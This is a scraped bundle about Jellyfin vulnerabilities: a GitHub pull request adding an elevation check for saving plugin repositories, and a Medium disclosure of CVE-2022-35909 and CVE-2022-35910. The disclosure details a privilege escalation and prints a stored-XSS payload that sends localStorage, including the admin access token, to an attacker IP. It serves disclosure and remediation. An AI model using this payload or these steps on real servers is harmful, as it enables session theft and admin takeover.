=== Content from github.com_99c366f2_20250114_185149.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjellyfin%2Fjellyfin%2Fpull%2F7569%2Ffiles)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjellyfin%2Fjellyfin%2Fpull%2F7569%2Ffiles)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fpull_requests%2Fshow%2Ffiles&source=header-repo&source_repo=jellyfin%2Fjellyfin)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[jellyfin](/jellyfin)
/
**[jellyfin](/jellyfin/jellyfin)**
Public

* [Notifications](/login?return_to=%2Fjellyfin%2Fjellyfin) You must be signed in to change notification settings
* [Fork
  3.3k](/login?return_to=%2Fjellyfin%2Fjellyfin)
* [Star
   36.5k](/login?return_to=%2Fjellyfin%2Fjellyfin)

* [Code](/jellyfin/jellyfin)
* [Issues
  458](/jellyfin/jellyfin/issues)
* [Pull requests
  149](/jellyfin/jellyfin/pulls)
* [Discussions](/jellyfin/jellyfin/discussions)
* [Actions](/jellyfin/jellyfin/actions)
* [Projects
  2](/jellyfin/jellyfin/projects)
* [Security](/jellyfin/jellyfin/security)
* [Insights](/jellyfin/jellyfin/pulse)

Additional navigation options

* [Code](/jellyfin/jellyfin)
* [Issues](/jellyfin/jellyfin/issues)
* [Pull requests](/jellyfin/jellyfin/pulls)
* [Discussions](/jellyfin/jellyfin/discussions)
* [Actions](/jellyfin/jellyfin/actions)
* [Projects](/jellyfin/jellyfin/projects)
* [Security](/jellyfin/jellyfin/security)
* [Insights](/jellyfin/jellyfin/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fjellyfin%2Fjellyfin%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fjellyfin%2Fjellyfin%2Fissues%2Fnew%2Fchoose)
to your account

# Require elevation to save list of plugin repositories #7569

 Merged

[joshuaboniface](/joshuaboniface)
merged 1 commit into
[jellyfin:release-10.8.z](/jellyfin/jellyfin/tree/release-10.8.z "jellyfin/jellyfin:release-10.8.z")
from
[crobibero:repo-auth](/crobibero/jellyfin/tree/repo-auth "crobibero/jellyfin:repo-auth")

Apr 8, 2022

[Conversation
0](/jellyfin/jellyfin/pull/7569)
[Commits
1](/jellyfin/jellyfin/pull/7569/commits)
[Checks
0](/jellyfin/jellyfin/pull/7569/checks)
[Files changed](/jellyfin/jellyfin/pull/7569/files)

 Merged

# [Require elevation to save list of plugin repositories](#top) #7569

 Changes from **all commits**

Commits

[Show all changes

1 commit](/jellyfin/jellyfin/pull/7569/files)
Select commit

[`7a8eaa8`
Require elevation to save the list of plugin repositories

crobibero Apr 8, 2022](/jellyfin/jellyfin/pull/7569/commits/7a8eaa8811c7148ede97e50c42af58c3d023711e)

**File filter**

### Filter by extension

Filter by extension

.cs
(1)

All 1 file type selected

---

Viewed files

[Clear filters](/jellyfin/jellyfin/pull/7569/files)

 **Conversations**

Failed to load comments.  Retry

 Loading

 **Jump to**

Jump to file

Failed to load files.  Retry

 Loading

##### Diff view

![Unified Diff View](https://github.githubassets.com/assets/unified-6de447b07fd7.svg)

Unified

![Split Diff View](https://github.githubassets.com/assets/split-b930d4a1df45.svg)

Split

Hide whitespace

 Apply and reload

Show whitespace

##### Diff view

![Unified Diff View](https://github.githubassets.com/assets/unified-6de447b07fd7.svg)

Unified

![Split Diff View](https://github.githubassets.com/assets/split-b930d4a1df45.svg)

Split

Hide whitespace

 Apply and reload

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[Jellyfin.Api/Controllers/PackageController.cs](#diff-76ab9633ddc678ae709e6c8662cd2d0c33541d78ab708158696513e3cda34b77 "Jellyfin.Api/Controllers/PackageController.cs")

Show comments

[View file](/crobibero/jellyfin/blob/7a8eaa8811c7148ede97e50c42af58c3d023711e/Jellyfin.Api/Controllers/PackageController.cs)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -155,7 +155,7 @@ public ActionResult<IEnumerable<RepositoryInfo>> GetRepositories() |
|  |  | /// <response code="204">Package repositories saved.</response> |
|  |  | /// <returns>A <see cref="NoContentResult"/>.</returns> |
|  |  | [HttpPost("Repositories")] |
|  |  | [Authorize(Policy = Policies.DefaultAuthorization)] |
|  |  | [Authorize(Policy = Policies.RequiresElevation)] |
|  |  | [ProducesResponseType(StatusCodes.Status204NoContent)] |
|  |  | public ActionResult SetRepositories([FromBody, Required] List<RepositoryInfo> repositoryInfos) |
|  |  | { |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from medium.com_21ee563d_20250114_185150.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F967359c91058&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2Fstolabs%2Fcve-2022-35909-cve-2022-35910-incorrect-access-control-and-xss-stored-to-jellyfin-967359c91058&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2Fstolabs%2Fcve-2022-35909-cve-2022-35910-incorrect-access-control-and-xss-stored-to-jellyfin-967359c91058&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# CVE-2022–35909 / CVE-2022–35910, Incorrect Access Control and XSS Stored to Jellyfin

[![CUPC4K3](https://miro.medium.com/v2/resize:fill:88:88/1*sikNx0qf7_UNyFkcoU5a6A.png)](/%40cupc4k3?source=post_page---byline--967359c91058--------------------------------)[![stolabs](https://miro.medium.com/v2/resize:fill:48:48/1*gTF5Rzr9-H4_L_Z4k1yjHg.png)](https://medium.com/stolabs?source=post_page---byline--967359c91058--------------------------------)

[CUPC4K3](/%40cupc4k3?source=post_page---byline--967359c91058--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fb1982ea52cc8&operation=register&redirect=https%3A%2F%2Fmedium.com%2Fstolabs%2Fcve-2022-35909-cve-2022-35910-incorrect-access-control-and-xss-stored-to-jellyfin-967359c91058&user=CUPC4K3&userId=b1982ea52cc8&source=post_page-b1982ea52cc8--byline--967359c91058---------------------post_header-----------)

Published in[stolabs](https://medium.com/stolabs?source=post_page---byline--967359c91058--------------------------------)·4 min read·Jul 18, 2022

--

Listen

Share

![]()

This vulnerability on version **10.7.7**,(fixed in 10.8.0)

Was discovered by [Dan Barros](https://medium.com/u/b1982ea52cc8?source=post_page---user_mention--967359c91058--------------------------------) and [Eduardo Cardoso](https://medium.com/u/801012ad17fa?source=post_page---user_mention--967359c91058--------------------------------) from [Stolabs](https://medium.com/stolabs) Security Research team.

# **What is Jellyfin?**

**Jellyfin** is a Free Software Media System that puts you in control of managing and streaming your media, to provide it from a dedicated server to end-user devices via multiple apps.

# **Let’s take the test**

When starting to recognize the application, we could observe an interesting point that caught our attention.

> In the test context we have only two registered users, “**user**” and “**adm**”.

Logged in as an unprivileged user it was possible to identify an incorrect access control when intercepting requests through burp in the /users endpoint. We were able to list all users registered in the application and in the policy field we were able to identify which users are administrators.

For this discovery we received **CVE-2022–35909**

![]()

Access to registered users

After this first step, another interesting point that we noticed is that each user receives a fixed ID of 32 alphanumeric characters registered in the system.

![]()

Comparing polyce

After collecting this information, we logged out and logged in again in the application and watching the requests after entering the username and password we came across the following:

In Jellyfin’s authentication requests, the application associates the UserID with the user’s name and, knowing that, we decided to change the userID to the administrator’s and see the result.

> During the authentication process we changed the userid to the adm user.

![]()

Authentication process in Jellyfin

After changing the user ID for the administrator, we log in as a user but load the administrator panel on the dashboard.

![]()

Comparing accesses

> We were able to access the **admin panel** with the **unprivileged user**.

![]()

User logged in with accessible admin panel

Re-identifying registered users on Jellyfin

![]()

Registered users

When I clicked on allow this user to administer the server and then on save I got a 403 forbidden and couldn’t escalate the privilege.

![]()

Unsuccessful attempt to escalate privilege

![]()

403 Forbidden

Returning to the authentication process, we saw that when logging in we received a session access token according to our access profile in the application.

![]()

Access token — User

# And now… how to get the admin access token?

Within the user profile and being able to access the admin dash, we noticed that the plugin does not validate the access token and even with restricted access we were able to save new repositories.

![]()

Process to insert new repository

![]()

Repository saved successfully

> WOW, Repository saved as user without permission.

![]()

Saving repository without authorization

# Stealing acess token via XSS Stored

In the tests we found that the field “**repository name**” is vulnerable to xss stored. After inserting a payload that would send us the admin’s localstorage content, where the acess token is located, we would be able to impersonate the admin in our requests and finally elevate our privilege.

> I opened port 8292 on my VPS and listened.

![]()

Opening the port on the attacker’s IP

**Payload used in exploration:**

<img src=x onerror=”document.location=’[http://MYIP:PORT/?'+(JSON.stringify(localStorage))](http://192.168.1.171:8595/?%27+%28JSON.stringify%28localStorage%29%29=)">

![]()

Inserting the payload

And after saving the xss in the ***name of the repository***, we wait for the adm to log in and access the **plugins/repositories** tab and receive the necessary data to complete our objective.

![]()

Receiving server connection

> Upon receiving the connection from the server, we will analyze the data received and there is the acess token of the logged in administrator.

![]()

AcessToken: 7aba1015bf714f1b83ac5d328c9c910a

After getting the access token from the administrator, we go back to the burp where we have the request to escalate our privilege and in this case we just need to change the access token to the administrator’s and become the server’s administrator.

![]()

Escalating our privilege

![]()

Allow this user to administer the server

For this discovery of the Xss stored we received the **CVE-2022–35910**

Wow, after logging out and logging back in as a user we became the jellyfin server administrator where we can create new users, delete, access restricted media among other functions. =)

[Pentesting](/tag/pentesting?source=post_page-----967359c91058--------------------------------)[Jellyfin](/tag/jellyfin?source=post_page-----967359c91058--------------------------------)[Red Team](/tag/red-team?source=post_page-----967359c91058--------------------------------)[Web Security](/tag/web-security?source=post_page-----967359c91058--------------------------------)

--

--

[![stolabs](https://miro.medium.com/v2/resize:fill:96:96/1*gTF5Rzr9-H4_L_Z4k1yjHg.png)](https://medium.com/stolabs?source=post_page---post_publication_info--967359c91058--------------------------------)[![stolabs](https://miro.medium.com/v2/resize:fill:128:128/1*gTF5Rzr9-H4_L_Z4k1yjHg.png)](https://medium.com/stolabs?source=post_page---post_publication_info--967359c91058--------------------------------)[## Published in stolabs](https://medium.com/stolabs?source=post_page---post_publication_info--967359c91058--------------------------------)[135 Followers](/stolabs/followers?source=post_page---post_publication_info--967359c91058--------------------------------)·[Last published Jan 6, 2023](/stolabs/how-saml-works-and-some-attacks-on-it-2f62db0ef1d9?source=post_page---post_publication_info--967359c91058--------------------------------)

STO Labs

[![CUPC4K3](https://miro.medium.com/v2/resize:fill:96:96/1*sikNx0qf7_UNyFkcoU5a6A.png)](/%40cupc4k3?source=post_page---post_author_info--967359c91058--------------------------------)[![CUPC4K3](https://miro.medium.com/v2/resize:fill:128:128/1*sikNx0qf7_UNyFkcoU5a6A.png)](/%40cupc4k3?source=post_page---post_author_info--967359c91058--------------------------------)Follow[## Written by CUPC4K3](/%40cupc4k3?source=post_page---post_author_info--967359c91058--------------------------------)[243 Followers](/%40cupc4k3/followers?source=post_page---post_author_info--967359c91058--------------------------------)·[68 Following](/%40cupc4k3/following?source=post_page---post_author_info--967359c91058--------------------------------)

Offensive Security | Cyber Security | Security Researcher | Red Team | Pentest

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----967359c91058--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----967359c91058--------------------------------)[About](/about?autoplay=1&source=post_page-----967359c91058--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----967359c91058--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----967359c91058--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----967359c91058--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----967359c91058--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----967359c91058--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----967359c91058--------------------------------)[Teams](/business?source=post_page-----967359c91058--------------------------------)



=== Content from docs.google.com_52bd64a6_20250114_185147.html ===
JavaScript isn't enabled in your browser, so this file can't be opened. Enable and reload.
Jellyfin         Share[Sign in](https://accounts.google.com/ServiceLogin?service=wise&passive=1209600&osid=1&continue=https://docs.google.com/document/d/1cBXQrokCvWxKET4BKi3ZLtVp5gst6-MrGPgMKpfXw8Y/edit&followup=https://docs.google.com/document/d/1cBXQrokCvWxKET4BKi3ZLtVp5gst6-MrGPgMKpfXw8Y/edit&ltmpl=docs&ec=GAZAGQ)FileEditViewToolsHelpAccessibilityDebug
